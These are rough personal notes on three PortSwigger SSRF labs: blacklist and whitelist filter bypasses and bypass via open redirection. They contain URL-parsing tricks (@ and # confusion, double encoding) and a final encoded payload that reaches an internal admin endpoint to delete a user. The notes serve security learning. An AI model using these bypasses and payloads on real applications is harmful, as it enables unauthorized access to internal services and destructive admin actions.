# Lab: SSRF with blacklist-based input filter
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

http://localhost/admin

rwq ---> waf (BL) ---> server (200 / 302 / 500)
req ----> waf (BL) ---> (400)


# Lab: SSRF with whitelist-based input filter
https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

req ----> waf (WL) ----> stock.weliketoshop.net (server A)
req ----> waf (WL) ----> localhost (server B)

salah - username
@ - at
gmail.com - domain/host

ssh://username@site.com


waf:
localhost%23@stock....net

server:
localhost#--------------/admin

#@stock.weliketoshop.net

https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4

https://www.youtube.com/watch?v=voTHFdL9S2k

@#%&<>^'"`
prtial list


# Lab: SSRF with filter bypass via open redirection vulnerability
https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

http://192.168.0.12:8080/admin

server side rwquest forgery

1. find SSRF injection point:
stockApi=

2. find a way out of the interanl system to the internal network:
/product/nextProduct?currentProductId=2&path=/product?productId=3

# final payload:
stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos